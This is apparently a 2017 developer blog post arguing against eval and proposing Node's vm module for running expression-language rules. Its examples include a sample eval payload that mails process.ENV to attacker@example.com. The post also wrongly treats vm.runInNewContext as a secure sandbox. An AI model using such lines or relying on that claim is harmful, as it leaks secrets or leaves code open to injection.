---
layout: post
title: "Eval no more: a journey through NodeJS' VM module and Expression Language"
date: 2017-03-02 22:21
comments: true
categories: [nodejs, javascript, vm, eval]
description: "A safer alternative to implement expression parsers in NodeJS: introducing the VM module."
---

How many times have you heard of [how evil eval is](https://www.google.ae/search?q=eval&oq=eval&aqs=chrome..69i57j69i60l3j0l2.673j0j7&sourceid=chrome&ie=UTF-8#q=eval+is+evil)? What if I told you that there is a safe alternative in the modern, server-side
JavaScript ecosystem?

<!-- more -->

## The problem with eval

{% img right /images/security.png %}

`eval` is not necessary evil -- you *just* need to make sure you're dealing with
trusted inputs.

The problem lies in that "*just*" -- you might be reading that
input from many sources and, if any of those sources gets compromised, you then
open up the door for a very straightforward code injection{% fn_ref 1 %}.

Funny things `eval` can do:

``` js
// Guess what?
eval('while(true) console.log(1)')
console.log('The application goes on...')

// What if the attacker doesn't want to waste time?
eval('process.exit(0)')
console.log('The application goes on...')

// Let's escalate...
eval('require("node-mailer").mail("attacker@example.com", JSON.stringify(process.ENV))')
console.log('The application goes on...')

// And, for the lolz:
eval('eval = undefined')
console.log('The application goes on...')
```

The last example is the one I like the most: there an attacker would re-define
the `eval` function itself, causing the application to crash (`TypeError: eval is not a function`)
the next time that block of code is executed.

Now that we've seen some basic examples on how you could easily tear down an
application that uses `eval` too eagerly, let's take a step back and try
to figure out when it could be a good idea to execute "external" code
on-the-fly.

## Free the code!

Ever heard of the [expression language](https://en.wikipedia.org/wiki/Unified_Expression_Language), or EL?

It's kind of a specification that defines a programming language used to evaluate
expressions such as:

```
car.maker == 'BMW' // returns a bool
```

as opposed to having to deal with the syntax and quirks of each and every language -- think of
PHP's [dollar sign and weird arrow-syntax](http://phpsadness.com/):

``` php
<?php
$car->getMaker() == 'BMW'
```

{% pullquote %}
Long story short, EL is a very **lightweight programming
language** that provides convenient shortcuts so that **any non-technical person can
write code**: initially thought of as a nicer replacement for writing regular code into HTML
templates, it's been widely used in the Java ecosystem and the [Symfony2 Framework](http://symfony.com/doc/current/components/expression_language.html)
popularized it in the PHP world.

Why am I telling you this? Well, because it's damn convenient, as {"you can let
non-programmers customize aspects of your applications through these expressions"}.
For example, imagine someone from your SEO team giving you a human-readable YAML
file like the following:
{% endpullquote %}

``` yaml seo-rules.yml
rules:
  - expr: category("new articles") && country("UK")
    keywords: "latest news, London, Manchester"
  - expr: category("new articles") && country("IT")
    keywords: "ultime notizie, Roma, Milano"
...
```

You can then import it in your application and add keywords to your webpage based
on those conditions -- with code that would look like:

``` js
function category(title) {
  return title === req.category.title
}

function country(code) {
  return code === req.country
}

let keywords = ''
let rules = parse('./rules.yml')

rules.each(rule => {
  try {
    if (eval(rule.expr)) {
      keywords += rule.keywords
    }
  } catch(err) {}
})

```

The advantage of using an expression language is that you don't  need to build
a full fledged CMS to customize various parts of your applications -- import a
file (or a spreadsheet) and you're done.

Doing this in JavaScript is even easier, as expressions are fundamentally valid
JS code that can be executed without the need of a [custom parser](http://symfony.com/doc/current/components/expression_language/extending.html).
Let's take a look at some expressions from the [Symfony2 website](http://symfony.com/doc/current/components/expression_language.html):

``` js
product.stock < 15

article.commentCount > 100 && article.category in ["misc"]

data["life"] + data["universe"] + data["everything"]

life + universe + everything
```

These are all **valid examples of JS code**: some operators
work a little bit differently (for example, in JS, `in` will mainly  work with
objects vs lists) but, if you're not too creative, you can basically make
sure your expressions are valid JS that can be executed without a custom
parser{% fn_ref 2 %}.

At [Namshi](https://en-ae.namshi.com/), for example, we allow our marketing
team to create voucher codes based on expressions that look like:

``` js
expr: order_subtotal_by_brand("nike", 50, "USD")
discount: 10
type: percent
```

(this would apply a 10% discount if the customer purchases at least 50 USD in Nike
products)

Now, you might think you just found the holy grail that allows you to avoid
building a complicated CMS and let stakeholders write that code for you -- so
you start hacking around, come up with a prototype, everyone is extremely stoked
and it goes into production within a few days. Now your SEO guy can customize
all of the metatags in your pages by simply requesting you to deploy an updated
version of `seo-rules.yml`.

Then, **disaster strikes**.

## Eval is not a sandbox

{% img right /images/expression-language.jpg %}

Even assuming your SEO guy is responsible enough to not make basic mistakes such
as toying around with the file and forgetting a `while` loop in one of the conditions,
you're still facing a potentially high security threat -- a user
might steal the email credentials of our SEO hero and send you a new version of
`seo-rules.yml` that contains dangerous code, asking you to deploy those changes
urgently. Since you trust the SEO guy, you don't even review it, go live and...


...good luck.

{% pullquote %}
The way EL has been implemented in Java, PHP and other languages is within the
context of a sandbox, where "accidental" code cannot do harm outside of the expression.
These languages have lexers, parsers and tokenizers that convert each and every
bit of the expression into a tree and execute it "safely", without letting it
access variables, functions or APIs that haven't been defined while building the
expression itself.

Simply put, let's look at the following example:

```
a === b ? c() : d()
```

An expression evaluator first tries to make sure the
expressions is syntactically valid and then figures out if all its components
are defined: in this case `a`, `b`, `c` and `d` need to be defined
within the context of the expression to be able to execute it.

That makes it so that, generally, we will be required to invoke the expression
like this:

``` js
evaluate(expr, {a, b, c, d})
```

{"If the expression uses a variable that is not defined within its context, the evaluation
will then throw an error, which is exactly what prevents code from breaking out of its intended scope"}{% fn_ref 3 %} to begin
with: `process`, `console`, `fs` and so on won't be available for an attacker to take
advantage of.

Instead, `eval` directly **executes code and has access to the same scope** it's
been called from{% fn_ref 4 %}: since it's missing a sandboxing feature,
it is a very risky and, in my opinion, a poor choice for implementing an expression
evaluator.
{% endpullquote %}

## VM to the rescue

Now, imagine you could run some JS code in a new "node process" that has no access
to the standard node library -- no `process`, no `console`, just basic plain JS: that's
what the `vm` module lets you do.

Let's take a look at this example:

``` js
const vm = require('vm')

let result = vm.runInNewContext('a + 1', {a: 2})

console.log(result) // 3
```

Here we are asking Node to create a new [V8 context](https://nodejs.org/api/vm.html#vm_what_does_it_mean_to_contextify_an_object) and run a bunch of code
(`a + 1`) there for us, passing an object that constitutes the global environment of
that new context (`{a: 2}`).

Note that the current execution context is not affected by what happens in that
new context:

``` js
let a = 0;
let result = vm.runInNewContext('a += 1', {a})

console.log(a) // 0
```

unless you specifically tell the VM that you want to re-use an existing context
or to use the current context with `vm.runInThisContext`:

``` js
a = 0;
vm.runInThisContext('a += 1')

console.log(a) // 1
```

When you use the current execution context (`runInThisContext`)
the executed code is going to have access to globally-defined variables of the current
context which, of course, exposes us to the same kind of problems we'd have with
`eval`:

``` js
a = 0;
let result = vm.runInThisContext('process.exit(0)')

console.log(result) // this will never run
```

So, let's stick to running our code on brand new execution contexts through `vm.runInNewContext`.

A nice "feature" of new contexts is that, by default, they can only be used to
execute plain old JS, as they don't have access to functions / node modules
unless **you** inject those in the context.

You can try it out for yourself in node's REPL:

``` js
~ (master ✔) ᐅ node
> vm.runInNewContext('1 + 1')
2

> vm.runInNewContext('1 + a')
ReferenceError: a is not defined
    at evalmachine.<anonymous>:1:5
    at ContextifyScript.Script.runInContext (vm.js:37:29)
    at ContextifyScript.Script.runInNewContext (vm.js:43:15)
    at Object.exports.runInNewContext (vm.js:74:17)
    at repl:1:4
    at realRunInThisContextScript (vm.js:22:35)
    at sigintHandlersWrap (vm.js:98:12)
    at ContextifyScript.Script.runInThisContext (vm.js:24:12)
    at REPLServer.defaultEval (repl.js:346:29)
    at bound (domain.js:280:14)

> vm.runInNewContext('1 + a', {a: 1})
2

> vm.runInNewContext('console.log(123)')
ReferenceError: console is not defined
    at evalmachine.<anonymous>:1:1
    at ContextifyScript.Script.runInContext (vm.js:37:29)
    at ContextifyScript.Script.runInNewContext (vm.js:43:15)
    at Object.exports.runInNewContext (vm.js:74:17)
    at repl:1:4
    at realRunInThisContextScript (vm.js:22:35)
    at sigintHandlersWrap (vm.js:98:12)
    at ContextifyScript.Script.runInThisContext (vm.js:24:12)
    at REPLServer.defaultEval (repl.js:346:29)
    at bound (domain.js:280:14)

> vm.runInNewContext('console.log(123)', {console})
123
undefined

> vm.runInNewContext('log("lol")', console)
lol
undefined
>
```

One of the hidden features of the `vm` module is that it uses implicit returns,
which means that **the return value of the expression is available to the main
execution context**. As we've already seen:

``` js
let result = vm.runInNewContext('Math.random() * 1000')
console.log(result) // 802.4222332991689
```

In fact, if you try to return "manually" you'll get a slap in the face:

``` js
let result = vm.runInNewContext('return Math.random() * 1000')
...
evalmachine.<anonymous>:1
return Math.random() * 1000
^^^^^^
SyntaxError: Illegal return statement
```

But implicit returns don't just stop there -- as you can write multiple
expressions and `vm` will make sure you get the return value of the last
block, even if you split your "code" into multiple lines:

``` js
let code  = `
let a = 1
let b = a
a + b
`
let result = vm.runInNewContext(code)
console.log(result) // 2
```

The other **killer feature** of the `vm` module is that it's able to **specify
timeouts for the scripts it executes**:

``` js
vm.runInNewContext(`while (true) 1`, {}, {timeout: 3})

Error: Script execution timed out.
    at ContextifyScript.Script.runInContext (vm.js:37:29)
    at ContextifyScript.Script.runInNewContext (vm.js:43:15)
    at Object.exports.runInNewContext (vm.js:74:17)
    at repl:1:4
    at realRunInThisContextScript (vm.js:22:35)
    at sigintHandlersWrap (vm.js:98:12)
    at ContextifyScript.Script.runInThisContext (vm.js:24:12)
    at REPLServer.defaultEval (repl.js:346:29)
    at bound (domain.js:280:14)
    at REPLServer.runBound [as eval] (domain.js:293:12)
```

In the above scenario, we're giving the script 3 milliseconds to execute
and, since it's trying to execute an infinite `while` loop, `vm` throws
an error and gives us an opportunity to catch it:

``` js
try {
    return vm.runInNewContext(`while (true) 1`, {}, {timeout: 3})
} catch(err) {
    // err could be a syntax error, timeout, etc
    console.error(err)

    return null
}
```

It's worth noting that the VM API is synchronous, so please be mindful
when assigning timeouts as you might end up stalling for too long.

## Performance overhead

{% pullquote %}
Of course, running code in a separate context requires quite some
overhead compared to running an `eval`: we need V8 to setup the context,
compile the code on-the-fly and, finally, execute it -- and the whole process
doesn't come very cheap.

Let's look at a simple benchmark that loops 1k times over an eval / vm
instruction and records the total time it takes for
the loop to complete{% fn_ref 5 %}:

``` js eval-vs-vm.js
let a = 0;
let i = 0;

console.time('eval')

for (i; i < 1000; i++) {
  eval('a++')
}

console.timeEnd('eval')

let b = 0;
let vm = require('vm');
i = 0;

console.time('vm')

for (i; i < 1000; i++) {
  vm.runInNewContext('b++', {b})
}

console.timeEnd('vm')
```

Even though this benchmark is not very scientific, it should give us a good idea
of the differences between the two, if any{% fn_ref 6 %}:

``` bash
/tmp ᐅ node eval-vs-vm.js
eval: 1.120ms
vm: 468.136ms
```

Holy moly, we're talking 1ms vs half a second here!

We could probably get some
better results if we re-use contexts rather than creating new ones in each
and every loop cycle but, at the end of the day, I think that would be pointless
as this is, of course, a provoking benchmark -- **{"never trade security for speed"}**.
{% endpullquote %}

In addition, I truly don't think you'll be evaluating thousands of expressions
on every request, so the speed footprint of using the VM module might look more
like this:

``` bash
/tmp ᐅ node
> console.time('r'); vm.runInNewContext('1 + 1', {}); console.timeEnd('r')
r: 1.778ms
```

Still expensive, but very minimal in the context of a request / response cycle{% fn_ref 6 %}.

## What about the browser?

There is no consensus on how we could achieve something similar on the client, as
the VM API is specific to Node{% fn_ref 8 %}; one very
interesting approach, though, is to use [web workers](http://blog.namangoel.com/replacing-eval-with-a-web-worker)
as they provide a semi-isolated context that cannot interfere with the original
window; alternatively, you could also use a JS expression language such as [Jexl](https://github.com/TechnologyAdvice/Jexl).

Even though these solutions are, in my opinion, very smart hacks (especially the one
that employs web workers), I'd wait for something like `vm` to be available on the
browser, so that you don't  have to re-invent the wheel and potentially come up with
a buggy, unsafe, custom-made alternative.

Last but not least, I'd like to mention that some believe [eval isn't such a threat](http://stackoverflow.com/a/198031/934439)
on the browser, as most clients can anyhow do the same kind of harm through the
DevTools' console. Even though, in principle, that's true, there are some [other
things to consider](http://stackoverflow.com/questions/197769/when-is-javascripts-eval-not-evil#comment19416896_198031)
that might still make `eval` a risky element of your codebase.

## Conclusion

It's been quite a long read if you've made it this far -- to reward you let me
recap the major points we've looked at today:

* there are business cases for evaluating external code, on-the-fly
* avoid using `eval` for that
* use node's `vm` module
  * always specify timeouts, else your code might halt the entire application (it's as simple as `vm.runInNewContext(code, context, {timeout: 10})`)
  * never use `vm.runInThisContext(...)`, it's similar to `eval`
  * try using new contexts whenever it's possible through `vm.runInNewContext(...)`
  * if using new contexts is too slow for you, then you can re-use contexts with `vm.runInContext(code, context)` -- but be aware that previous runs might influence subsequent ones by modifying the shared context

As always, feel free to leave your feedback in the
comments!

{% footnotes %}
  {% fn Here I am running under the assumption everyone understand why you shouldn't expose eval to the public through forms etc, and you only use it on "protected" backends %}
  {% fn Another example, you should use '&&' and not 'and' %}
  {% fn I use the word "breakout" meaning code that uses APIs it shouldn't have access too. As usual, my english is too limited :) %}
  {% fn including the global one because you can just use global.$VAR in Node ¯\\_(ツ)_/¯ %}
  {% fn console.time|timeEnd are amazing for this kind of quick benchmarks %}
  {% fn Code was running on Node v7.4.0 %}
  {% fn Unless you are, of course, optimizing for each and every ms. In general, I tend to forget about these optimizations as the bottleneck is usually somewhere in the network, or a DB query, so optimizing for that won't really move the needle %}
  {% fn I assume that's because it's based on a V8 feature, contexts, that is not really standardized / spread across all engines %}
{% endfootnotes %}
